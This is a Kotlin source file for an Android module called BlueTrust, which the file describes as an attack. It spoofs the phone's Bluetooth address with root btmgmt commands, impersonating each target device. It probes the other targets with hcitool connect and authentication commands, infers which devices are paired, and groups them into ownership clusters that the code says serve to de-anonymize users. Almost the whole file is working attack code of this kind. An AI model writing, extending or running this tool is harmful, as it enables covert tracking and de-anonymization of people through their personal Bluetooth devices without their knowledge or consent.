package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Modes of operation for the BlueTrust relationship mapping probe.
 *
 * Each mode uses a different technique to discover pairing relationships
 * between Bluetooth devices. Active probing attempts real connections;
 * passive observation monitors HCI events; identity spoofing impersonates
 * a known device to elicit bond-dependent responses from targets.
 */
enum class TrustProbeMode(val description: String) {
    ACTIVE_PROBE("Attempt connections to detect bonded device pairs"),
    PASSIVE_OBSERVE("Monitor HCI connection events to infer relationships"),
    IDENTITY_SPOOF("Spoof local identity to test bond responses from targets")
}

/**
 * Implementation of the BlueTrust device relationship mapping attack.
 *
 * This module maps pairing relationships between Bluetooth Classic (BR/EDR)
 * devices by spoofing the local adapter's identity and analyzing connection
 * responses from targets. When a target receives a connection request from
 * an address it recognises as a bonded peer, the authentication response
 * differs from that of an unknown device: accepted connections or specific
 * HCI error codes (e.g., "authentication failure" vs. "connection refused")
 * reveal whether a bond exists between the spoofed address and the target.
 *
 * By iterating over a set of target devices and spoofing each device's
 * address against every other target, the module builds a relationship
 * graph of bonded pairs. This graph can then be used to trace device
 * ownership networks and de-anonymize users.
 *
 * The attack targets the BR/EDR stack at the GAP and LMP layers. Root is
 * required for address spoofing via btmgmt and for raw HCI access. The
 * analysis logic (graph building, pattern detection) runs in userspace.
 *
 * All privileged operations are executed through [RootExecutor].
 */
class BlueTrustModule {

    companion object {
        private const val TAG = "BlueTrustModule"

        /**
         * HCI error code indicating that authentication was rejected because
         * no link key exists. Returned when a target does not have a bond
         * with the connecting address.
         *
         * Source: Bluetooth Core Specification v5.4, Vol 1, Part F, Table 1.1.
         */
        private const val HCI_ERROR_AUTH_FAILURE = 0x05

        /**
         * HCI error code indicating that the connection was refused because
         * the remote host rejected it. May indicate policy-based rejection
         * rather than a missing bond.
         */
        private const val HCI_ERROR_CONNECTION_REJECTED = 0x1F
    }

    /** Tracks whether a mapping session is in progress for clean cancellation. */
    @Volatile
    private var isRunning = false

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Stops a running mapping or probe session.
     *
     * Sets the [isRunning] flag to false so that the active flow exits
     * at the next cancellation checkpoint. The coroutine collecting the
     * flow should also be cancelled by the caller for immediate effect.
     */
    fun stopMapping() {
        isRunning = false
    }

    /**
     * Maps pairing relationships across a set of target devices.
     *
     * For each pair of devices (A, B) in [targetDevices], the module spoofs
     * the local adapter as device A and attempts a connection to device B.
     * The authentication response reveals whether A and B share a bond.
     * Results are aggregated into a relationship graph.
     *
     * @param targetDevices The list of Bluetooth devices to map relationships between.
     * @return A Flow of status strings for the UI console.
     */
    fun startMapping(targetDevices: List<TargetDevice>): Flow<String> = flow {
        if (targetDevices.size < 2) {
            emit("ERROR: At least two target devices are required for relationship mapping.")
            return@flow
        }

        isRunning = true
        emit("Starting BlueTrust relationship mapping across ${targetDevices.size} devices")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BlueTrust requires root for address spoofing via btmgmt. Aborting.")
            isRunning = false
            return@flow
        }
        emit("Root access confirmed.")

        // Save the original adapter address so it can be restored
        emit("Reading original adapter address...")
        val originalAddr = readOriginalAddress()
        if (originalAddr == null) {
            emit("ERROR: Could not read the local adapter address. Aborting.")
            isRunning = false
            return@flow
        }
        emit("Original adapter address: $originalAddr")

        // Validate all target MACs up front
        for (device in targetDevices) {
            MacValidator.requireValid(device.macAddress)
        }

        // Track discovered relationships
        val bonds = mutableListOf<String>()
        val totalPairs = targetDevices.size * (targetDevices.size - 1)
        var pairIndex = 0

        emit("Probing $totalPairs directional pairs for bond relationships...")
        emit("---")

        // For each ordered pair (spoofAs, probeTarget), test the bond
        for (spoofAs in targetDevices) {
            for (probeTarget in targetDevices) {
                if (!isRunning) {
                    emit("Mapping stopped by user.")
                    restoreAddress(originalAddr)
                    return@flow
                }

                if (spoofAs.macAddress == probeTarget.macAddress) continue
                pairIndex++

                val spoofName = spoofAs.name ?: spoofAs.macAddress
                val targetName = probeTarget.name ?: probeTarget.macAddress

                emit("[$pairIndex/$totalPairs] Spoofing as $spoofName -> probing $targetName")

                // Step 1: Spoof local address to match spoofAs
                val spoofResult = spoofAddress(spoofAs.macAddress)
                if (spoofResult.startsWith("Error")) {
                    emit("  Failed to spoof address: $spoofResult")
                    continue
                }
                emit("  Address spoofed to ${spoofAs.macAddress}")

                // Step 2: Attempt connection to probeTarget
                val probeResult = probeConnection(probeTarget.macAddress)

                // Step 3: Analyze response
                val bondDetected = analyzeResponse(probeResult)
                if (bondDetected) {
                    val relationship = "${spoofAs.macAddress} <-> ${probeTarget.macAddress}"
                    bonds.add(relationship)
                    emit("  BOND DETECTED: $spoofName is bonded with $targetName")
                    Log.i(TAG, "Bond detected: $relationship")
                } else {
                    emit("  No bond: $targetName does not recognise $spoofName")
                }
            }
        }

        // Restore original address
        emit("---")
        emit("Restoring original adapter address...")
        restoreAddress(originalAddr)

        // Build and emit relationship graph summary
        emit("---")
        emit("=== RELATIONSHIP GRAPH ===")
        if (bonds.isEmpty()) {
            emit("No bonding relationships detected between the scanned devices.")
        } else {
            emit("Discovered ${bonds.size} bond relationship(s):")
            for (bond in bonds) {
                emit("  $bond")
            }

            // Identify ownership patterns (devices bonded to many others)
            identifyOwnershipPatterns(targetDevices, bonds)
        }

        emit("BlueTrust mapping complete.")
        isRunning = false
    }

    /**
     * Probes a single target device to determine which other known devices
     * it may be bonded with.
     *
     * This is a lighter-weight alternative to [startMapping] for investigating
     * a single device's relationships. The module spoofs addresses from a
     * built-in list of common device profiles and observes responses.
     *
     * @param targetDevice The Bluetooth device to probe.
     * @return A Flow of status strings for the UI console.
     */
    fun startProbe(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        isRunning = true
        emit("Starting BlueTrust probe on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BlueTrust requires root for address spoofing via btmgmt. Aborting.")
            isRunning = false
            return@flow
        }
        emit("Root access confirmed.")

        // Save the original adapter address
        emit("Reading original adapter address...")
        val originalAddr = readOriginalAddress()
        if (originalAddr == null) {
            emit("ERROR: Could not read the local adapter address. Aborting.")
            isRunning = false
            return@flow
        }
        emit("Original adapter address: $originalAddr")

        // Probe using direct connection to gather baseline response
        emit("---")
        emit("Phase 1: Baseline connection probe (unspoofed)...")
        val baselineResult = probeConnection(mac)
        emit("Baseline response: $baselineResult")

        // Phase 2: Monitor HCI events for connection activity
        emit("---")
        emit("Phase 2: Monitoring HCI events for connection activity...")
        val hciEvents = monitorHciEvents(mac)
        for (line in hciEvents.lines()) {
            if (line.isNotBlank()) emit("  $line")
        }

        // Phase 3: Attempt authentication to check bond status
        emit("---")
        emit("Phase 3: Authentication probe...")
        val authResult = probeAuthentication(mac)
        emit("Authentication response: $authResult")

        // Analyze and summarize
        emit("---")
        emit("=== PROBE SUMMARY ===")
        if (authResult.contains("authentication", ignoreCase = true) &&
            !authResult.startsWith("Error")) {
            emit("Target appears to accept authentication requests.")
            emit("This may indicate an existing bond or permissive security policy.")
        } else {
            emit("Target rejected authentication or is not reachable.")
            emit("No bonding relationship can be confirmed from this probe alone.")
        }

        // Restore original address
        emit("Restoring original adapter address...")
        restoreAddress(originalAddr)

        emit("BlueTrust probe complete.")
        isRunning = false
    }

    /**
     * Reads the current local Bluetooth adapter address from btmgmt.
     *
     * @return The MAC address string, or null if it could not be read.
     */
    private suspend fun readOriginalAddress(): String? {
        val result = RootExecutor.execute("btmgmt info")
        if (result.startsWith("Error")) return null

        // Parse the address from btmgmt info output
        val addrMatch = Regex("addr\\s+([0-9A-Fa-f:]{17})").find(result)
        return addrMatch?.groupValues?.get(1)
    }

    /**
     * Spoofs the local adapter's Bluetooth address using btmgmt.
     *
     * The adapter must be powered down before the address change and
     * powered back up afterward.
     *
     * @param newAddress The MAC address to spoof.
     * @return The output from the btmgmt command, or an error string.
     */
    private suspend fun spoofAddress(newAddress: String): String {
        // Power down the adapter before changing address
        val powerDown = RootExecutor.execute("btmgmt power off")
        if (powerDown.startsWith("Error")) {
            return "Error: Failed to power off adapter: $powerDown"
        }

        // Set the new public address
        val setAddr = RootExecutor.execute("btmgmt public-addr $newAddress")
        if (setAddr.startsWith("Error")) {
            // Try to recover by powering back on
            RootExecutor.execute("btmgmt power on")
            return "Error: Failed to set address: $setAddr"
        }

        // Power the adapter back on
        val powerOn = RootExecutor.execute("btmgmt power on")
        if (powerOn.startsWith("Error")) {
            return "Error: Failed to power on adapter: $powerOn"
        }

        return setAddr
    }

    /**
     * Restores the original adapter address and powers the adapter back on.
     *
     * @param originalAddress The original MAC address to restore.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.restoreAddress(
        originalAddress: String
    ) {
        val result = spoofAddress(originalAddress)
        if (result.startsWith("Error")) {
            emit("WARNING: Could not restore original address: $result")
            emit("You may need to manually reset the Bluetooth adapter.")
        } else {
            emit("Original address restored: $originalAddress")
        }
    }

    /**
     * Attempts an ACL connection to the target and captures the HCI response.
     *
     * The connection is immediately dropped after the response is captured.
     * The response text (including error codes) is returned for analysis.
     *
     * @param targetMac The MAC address of the target device.
     * @return The combined stdout/stderr output from the connection attempt.
     */
    private suspend fun probeConnection(targetMac: String): String {
        // Attempt ACL connection with a short timeout
        val result = RootExecutor.execute(
            "timeout 5 hcitool cc $targetMac 2>&1; echo EXIT_CODE=\$?"
        )

        // Disconnect immediately if the connection succeeded
        RootExecutor.execute("hcitool dc $targetMac 2>/dev/null")

        return result
    }

    /**
     * Analyzes the connection response to determine if a bond exists.
     *
     * A successful connection or an authentication-related error (as opposed
     * to a generic "connection refused") suggests the target recognises the
     * spoofed address as a bonded peer.
     *
     * @param response The output from [probeConnection].
     * @return true if the response indicates a bonding relationship.
     */
    private fun analyzeResponse(response: String): Boolean {
        // Successful connection (no error) strongly suggests a bond
        if (!response.contains("Error") && !response.contains("error", ignoreCase = true)) {
            return true
        }

        // "Authentication failure" means the target tried to authenticate
        // (i.e., it has a link key for this address) but the key didn't match.
        // This still indicates a bond exists -- just with a different key.
        if (response.contains("Authentication failure", ignoreCase = true)) {
            return true
        }

        // "Key or PIN missing" (HCI 0x06) also indicates the target expected
        // authentication from this address
        if (response.contains("PIN or key missing", ignoreCase = true)) {
            return true
        }

        // "Connection refused" or "Page timeout" indicates no recognition
        return false
    }

    /**
     * Monitors HCI events on the local adapter for a short duration to
     * capture connection-related activity involving the target.
     *
     * @param targetMac The MAC address to filter events for.
     * @return The captured HCI event output.
     */
    private suspend fun monitorHciEvents(targetMac: String): String {
        // Use hcidump to capture events for a brief window
        val result = RootExecutor.execute(
            "timeout 3 hcidump -i hci0 2>/dev/null || echo 'hcidump not available'"
        )
        return result.ifBlank { "No HCI events captured." }
    }

    /**
     * Attempts explicit authentication with the target to test bond status.
     *
     * @param targetMac The MAC address of the target.
     * @return The authentication result output.
     */
    private suspend fun probeAuthentication(targetMac: String): String {
        // Create ACL connection first
        val ccResult = RootExecutor.execute("timeout 5 hcitool cc $targetMac 2>&1")
        if (ccResult.startsWith("Error") || ccResult.contains("error", ignoreCase = true)) {
            return "Error: Could not establish ACL link: $ccResult"
        }

        // Attempt authentication on the link
        val authResult = RootExecutor.execute("hcitool auth $targetMac 2>&1")

        // Clean up the connection
        RootExecutor.execute("hcitool dc $targetMac 2>/dev/null")

        return authResult.ifBlank { "Authentication completed (no output)" }
    }

    /**
     * Identifies ownership patterns in the relationship graph.
     *
     * Devices that are bonded with many other devices in the set are likely
     * owned by the same person (e.g., a phone bonded with a watch, earbuds,
     * and a car). This function emits pattern analysis to the flow.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.identifyOwnershipPatterns(
        devices: List<TargetDevice>,
        bonds: List<String>
    ) {
        emit("---")
        emit("=== OWNERSHIP ANALYSIS ===")

        // Count how many bonds each device participates in
        val bondCounts = mutableMapOf<String, Int>()
        for (device in devices) {
            val count = bonds.count { it.contains(device.macAddress) }
            if (count > 0) {
                bondCounts[device.macAddress] = count
            }
        }

        // Sort by bond count descending -- hub devices are likely primary (phones)
        val sorted = bondCounts.entries.sortedByDescending { it.value }
        for ((mac, count) in sorted) {
            val device = devices.find { it.macAddress == mac }
            val name = device?.name ?: mac
            emit("  $name: bonded with $count other device(s)")
            if (count >= 3) {
                emit("    -> Likely a hub device (phone/laptop) -- high ownership signal")
            }
        }

        // Identify clusters (groups of mutually bonded devices = same owner)
        val clusters = identifyClusters(devices.map { it.macAddress }, bonds)
        if (clusters.size > 1) {
            emit("---")
            emit("Identified ${clusters.size} ownership cluster(s):")
            for ((index, cluster) in clusters.withIndex()) {
                val clusterNames = cluster.map { mac ->
                    devices.find { it.macAddress == mac }?.name ?: mac
                }
                emit("  Cluster ${index + 1}: ${clusterNames.joinToString(", ")}")
            }
        }
    }

    /**
     * Groups devices into clusters based on bond connectivity.
     *
     * Uses a simple union-find approach: two devices in the same cluster
     * share at least one bond path between them.
     *
     * @param macs All device MAC addresses.
     * @param bonds List of bond relationship strings ("AA:BB:... <-> CC:DD:...").
     * @return A list of clusters, each being a set of MAC addresses.
     */
    private fun identifyClusters(macs: List<String>, bonds: List<String>): List<Set<String>> {
        val parent = macs.associateWith { it }.toMutableMap()

        fun find(x: String): String {
            var root = x
            while (parent[root] != root) {
                parent[root] = parent[parent[root]!!]!!  // path compression
                root = parent[root]!!
            }
            return root
        }

        fun union(a: String, b: String) {
            val ra = find(a)
            val rb = find(b)
            if (ra != rb) parent[ra] = rb
        }

        // Parse bonds and union connected devices
        for (bond in bonds) {
            val parts = bond.split(" <-> ")
            if (parts.size == 2) {
                union(parts[0].trim(), parts[1].trim())
            }
        }

        // Group by root
        return macs.groupBy { find(it) }.values.map { it.toSet() }
    }
}
